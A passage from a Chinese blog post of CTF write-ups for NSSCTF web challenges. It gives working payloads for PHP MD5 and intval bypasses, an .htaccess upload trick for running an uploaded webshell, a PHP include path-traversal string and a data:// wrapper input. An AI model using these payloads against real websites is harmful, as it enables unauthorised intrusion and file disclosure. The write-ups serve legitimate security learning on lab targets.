  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-link"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9A%91%E5%81%87%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">暑假题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NSSCTF-2022-Spring-Recruit-babyphp"><span class="nav-number">1.1.</span> <span class="nav-text">[NSSCTF 2022 Spring Recruit]babyphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF-2019-BabyUpload"><span class="nav-number">1.2.</span> <span class="nav-text">[GXYCTF 2019]BabyUpload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GDOUCTF-2023-EZ-WEB"><span class="nav-number">1.3.</span> <span class="nav-text">[GDOUCTF 2023]EZ WEB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-Warmup"><span class="nav-number">1.4.</span> <span class="nav-text">[HCTF 2018]Warmup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GDOUCTF-2023-%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85"><span class="nav-number">1.5.</span> <span class="nav-text">[GDOUCTF 2023]泄露的伪装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-pklovecloud"><span class="nav-number">1.6.</span> <span class="nav-text">[第五空间 2021]pklovecloud</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="nav-number">1.6.1.</span> <span class="nav-text">第一种解法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="nav-number">1.6.2.</span> <span class="nav-text">第二种解法：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="nav-number">1.7.</span> <span class="nav-text">[SWPUCTF 2022 新生赛]ez_rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-Middle-magic"><span class="nav-number">1.8.</span> <span class="nav-text">[鹤城杯 2021]Middle magic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection"><span class="nav-number">1.9.</span> <span class="nav-text">[第五空间 2021]yet_another_mysql_injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-easy-html"><span class="nav-number">1.10.</span> <span class="nav-text">[HNCTF 2022 Week1]easy_html</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HDCTF-2023-SearchMaster"><span class="nav-number">1.11.</span> <span class="nav-text">[HDCTF 2023]SearchMaster</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easycon"><span class="nav-number">1.12.</span> <span class="nav-text">[羊城杯 2020]easycon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="nav-number">1.13.</span> <span class="nav-text">[第五空间 2021]EasyCleanup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%A5%87%E5%A6%99%E7%9A%84MD5"><span class="nav-number">1.14.</span> <span class="nav-text">[SWPUCTF 2022 新生赛]奇妙的MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NISACTF-2022-middlerce"><span class="nav-number">1.15.</span> <span class="nav-text">[NISACTF 2022]middlerce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUSTCTF-2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="nav-number">1.16.</span> <span class="nav-text">[WUSTCTF 2020]朴实无华</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF-2023-Flag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81"><span class="nav-number">1.17.</span> <span class="nav-text">[LitCTF 2023]Flag点击就送！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NISACTF-2022-join-us"><span class="nav-number">1.18.</span> <span class="nav-text">[NISACTF 2022]join-us</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-numgame"><span class="nav-number">1.19.</span> <span class="nav-text">[SWPUCTF 2022 新生赛]numgame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="nav-number">1.20.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]hardrce_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-easy-include"><span class="nav-number">1.21.</span> <span class="nav-text">[HNCTF 2022 WEEK2]easy_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F"><span class="nav-number">1.22.</span> <span class="nav-text">[GDOUCTF 2023]反方向的钟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NCTF-2018-flask%E7%9C%9F%E9%A6%99"><span class="nav-number">1.23.</span> <span class="nav-text">[NCTF 2018]flask真香</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019%E5%88%9D%E8%B5%9B-Love-Math"><span class="nav-number">1.24.</span> <span class="nav-text">[CISCN 2019初赛]Love Math</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NSSRound-8-Basic-MyDoor"><span class="nav-number">1.25.</span> <span class="nav-text">[NSSRound#8 Basic]MyDoor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-sql"><span class="nav-number">1.26.</span> <span class="nav-text">[SWPUCTF 2022 新生赛]ez_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="nav-number">1.27.</span> <span class="nav-text">[BJDCTF 2020]ZJCTF，不过如此</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="nav-number">1.28.</span> <span class="nav-text">[鹏城杯 2022]简单的php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NISACTF-2022-hardsql"><span class="nav-number">1.29.</span> <span class="nav-text">[NISACTF 2022]hardsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GKCTF-2020-CheckIN"><span class="nav-number">1.30.</span> <span class="nav-text">[GKCTF 2020]CheckIN</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="liberator"
      src="/images/touxiang.jpg">
  <p class="site-author-name" itemprop="name">liberator</p>
  <div class="site-description" itemprop="description">君子坐而论道，少年起而行之</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/yyb20040616" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yyb20040616" rel="noopener me" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="NSSCTF刷题 | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          NSSCTF刷题
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-08-02 18:34:55 / 修改时间：18:35:57" itemprop="dateCreated datePublished" datetime="2023-08-02T18:34:55+08:00">2023-08-02</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>42k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:16</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="暑假题目"><a href="#暑假题目" class="headerlink" title="暑假题目"></a>暑假题目</h1><h2 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h2><p>先看题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;</span><br><span class="line">    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br><span class="line">            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;yee&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;nop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;go on&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;let&#x27;s get some php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; let&#x27;s get some php</span><br></pre></td></tr></table></figure>

<p>可以看到是要通过四个if的检测才能成功拿到flag</p>
<p>第一个if检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))</span><br></pre></td></tr></table></figure>

<p>会进行取整，直接进行数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>可以看到成功绕过</p>
<p>第二个和第三个if</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])</span><br><span class="line">if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))</span><br></pre></td></tr></table></figure>

<p>要求POST传参b1和b2，并且传上去的参数本身值不同，但md5值要相同</p>
<p>直接用数组进行绕过即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1[]=2&amp;b2[]=3</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>成功绕过</p>
<p>最后一个if</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))</span><br></pre></td></tr></table></figure>

<p>要求传上去的值为字符串且值不同但是md5值要相同</p>
<p>直接使用0e开头的科学计数法就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1=s878926199a&amp;c2=s155964671a</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>直接就拿到了flag</p>
<h2 id="GXYCTF-2019-BabyUpload"><a href="#GXYCTF-2019-BabyUpload" class="headerlink" title="[GXYCTF 2019]BabyUpload"></a>[GXYCTF 2019]BabyUpload</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目就是一个文件上传的界面，nss标签提醒了是MIME验证并且要用到.htaccess文件，当我们尝试上传php文件时发现回显是不能上传后缀名为ph的文件，所以抓包改后缀，同时要改Content-type</p>
<p>先抓包上传.htaccess文件，文件内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch  &quot;wen&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现上传成功，下一步就是上传后缀名为wen的真正的木马文件，注意也要改content-type</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>发现又上传成功，接下来将路径复制下来加在题目地址后面就行，用hackbar执行命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/993203c1a20fe34d2fc406badd31d804/muma2.wen</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>成功拿到flag。</p>
<h2 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h2><p>题目一进去就只有一个按键，并且点击之后只出来一个弹窗就没反应了，所以按F12看看</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现让我们访问src</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>发现是一个flask所写的轻量化web程序</p>
<p>如果以get方式访问&#x2F;路由，就返回index.html的内容</p>
<p>如果以get方式访问&#x2F;src路由，就返回app.py的内容</p>
<p>如果以PUT方式访问&#x2F;super-secret-route-nobody-will-guess，就返回flag文件的内容</p>
<p>所以果断选第三个</p>
<p>直接抓包改代理，将传输方式改为PUT方式即可</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<h2 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="[HCTF 2018]Warmup"></a>[HCTF 2018]Warmup</h2><p>题目一进去是一张很欠的表情包，F12查看源码，访问source.php得到题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现了hint.php</p>
<p>尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>我们知道了flag的位置，再退回上一步审计代码</p>
<p>先说说整体的逻辑：</p>
<ol>
<li>首先，使用highlight_file函数将当前文件的源代码输出，即将代码以语法高亮的形式显示出来。</li>
<li>然后定义了一个名为emmm的类，其中包含了一个名为checkFile的静态方法。这个方法用来检查并允许包含指定文件。</li>
<li>在checkFile方法中，首先定义了一个白名单数组$whitelist，包含了允许访问的文件名。</li>
<li>接着，通过检查传入的page参数，判断是否符合条件。如果page为空或不是一个字符串，将输出”you can’t see it”并返回false。</li>
<li>如果$page在白名单数组中存在，直接返回true。</li>
<li>否则，首先对page参数进行处理，截取其中的部分字符直到遇到第一个问号（?）为止，并赋值给<em>p<strong>a</strong>g**e</em>进行处理，截取其中的部分字符直到遇到第一个问号（?）为止，并赋值给_page变量。</li>
<li>然后按照同样的逻辑，对$_page进行处理，再次截取部分字符直到遇到第一个问号（?）为止。</li>
<li>最后，对$_page进行URL解码，并再次进行截取处理。</li>
<li>如果最终的$_page在白名单数组中存在，返回true。</li>
<li>如果以上条件都不满足，将输出”you can’t see it”并返回false。</li>
<li>在主程序中，首先检查请求中是否存在名为file的参数，并且该参数是一个非空字符串。然后调用emmm类的checkFile方法进行文件检查。</li>
<li>如果文件检查通过，使用include语句包含请求中指定的文件，并立即退出程序。</li>
<li>如果文件检查不通过，将输出一段HTML代码，其中包含了一个图片的URL。</li>
</ol>
<p>接下来再说说其中的一些函数：</p>
<p>mb_substr(str,start,length,encoding):返回从start位置开始的长度为length的字符串。</p>
<p>mb_strpos(str,find_str,offset,encoding):返回str中从offset(默认为0)开始第一次出现find_str的位置。</p>
<p>urlcode():对其传入的str参数进行str解码。</p>
<p>到这里问完了chatgpt之后就麻了，不知道下一步该怎么办</p>
<p>这里看wp，知道了include比较阴间的一个小特性：include函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</p>
<p>使用..&#x2F;逐级进行跳转，最终得到正确的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=source.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>source.php换成hint.php也可，就得到了flag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHCTF%202018%5DWarmup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<h2 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h2><p>这道题是一个源码泄露，一开始以为是git泄露，还去拿githacker扫描了一下，发现没有反应</p>
<p>有用ddiresearch试了试，发现了返回状态唯一正常的两个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www.rar                         /test.txt</span><br></pre></td></tr></table></figure>

<p>尝试进行访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>这是test.txt的内容</p>
<p>他会读取cxk所传入文件的值，如果文件的值为ctrl，就打印出flag</p>
<p>再下载<a target="_blank" rel="noopener" href="http://www.rar,查看其中内容/">www.rar，查看其中内容</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">恭喜你</span><br><span class="line">turn to</span><br><span class="line"></span><br><span class="line">/orzorz.php</span><br></pre></td></tr></table></figure>

<p>尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cxk&#x27;]))&#123;</span><br><span class="line">    $cxk=$_GET[&#x27;cxk&#x27;];</span><br><span class="line">    if(file_get_contents($cxk)==&quot;ctrl&quot;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;洗洗睡吧&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;nononoononoonono&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; nononoononoonono</span><br></pre></td></tr></table></figure>

<p>这个php文件里才是可执行源码</p>
<p>为了达到传入文件参数，且内容为ctrl，就使用data:&#x2F;&#x2F;数据流协议：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cxk=data://text/plain,ctrl</span><br></pre></td></tr></table></figure>

